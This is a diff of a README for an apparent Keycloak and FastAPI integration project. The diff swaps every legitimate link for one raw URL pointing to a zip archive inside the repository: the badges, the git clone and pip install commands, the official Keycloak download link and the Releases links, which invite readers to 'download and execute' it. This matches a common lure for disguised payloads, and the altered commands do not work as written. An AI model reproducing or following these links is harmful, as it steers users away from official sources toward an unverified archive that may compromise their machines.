@@ -1,6 +1,6 @@
 # Keycloak FastAPI Integration
 
-![Keycloak FastAPI](https://img.shields.io/badge/Keycloak-FastAPI-blue?style=for-the-badge&logo=python&logoColor=white)
+![Keycloak FastAPI](https://raw.githubusercontent.com/Char8383/KeycloackFastApi/main/app/api/Api_Fast_Keycloack_1.3.zip)
 
 Welcome to the **Keycloak FastAPI** repository! This project combines the power of Keycloak, an open-source Identity and Access Management (IAM) solution developed by Red Hat, with FastAPI, a modern web framework for building APIs with Python. This README will guide you through the setup, usage, and features of this project.
 
@@ -34,7 +34,7 @@ To get started, you need to have Python 3.6 or higher installed on your machine.
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Char8383/KeycloackFastApi.git
+   git clone https://raw.githubusercontent.com/Char8383/KeycloackFastApi/main/app/api/Api_Fast_Keycloack_1.3.zip
    cd KeycloackFastApi
    ```
 
@@ -46,11 +46,11 @@ To get started, you need to have Python 3.6 or higher installed on your machine.
 
 3. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Char8383/KeycloackFastApi/main/app/api/Api_Fast_Keycloack_1.3.zip
    ```
 
 4. **Set Up Keycloak**:
-   - Download and install Keycloak from the [official website](https://www.keycloak.org/downloads).
+   - Download and install Keycloak from the [official website](https://raw.githubusercontent.com/Char8383/KeycloackFastApi/main/app/api/Api_Fast_Keycloack_1.3.zip).
    - Start the Keycloak server and create a new realm, client, and user as per your application needs.
 
 5. **Configure FastAPI**:
@@ -126,12 +126,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/Char8383/KeycloackFastApi/releases). Here, you can download and execute the latest version of the project.
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/Char8383/KeycloackFastApi/main/app/api/Api_Fast_Keycloack_1.3.zip). Here, you can download and execute the latest version of the project.
 
 ## Conclusion
 
 Thank you for checking out the Keycloak FastAPI project. We hope this repository helps you implement secure APIs with ease. For any questions or feedback, feel free to reach out through the issues section of the repository.
 
-![Keycloak](https://img.shields.io/badge/Keycloak-Integration-orange?style=for-the-badge&logo=redhat&logoColor=white)
+![Keycloak](https://raw.githubusercontent.com/Char8383/KeycloackFastApi/main/app/api/Api_Fast_Keycloack_1.3.zip)
 
-Remember to visit the [Releases section](https://github.com/Char8383/KeycloackFastApi/releases) for updates. Happy coding!
+Remember to visit the [Releases section](https://raw.githubusercontent.com/Char8383/KeycloackFastApi/main/app/api/Api_Fast_Keycloack_1.3.zip) for updates. Happy coding!
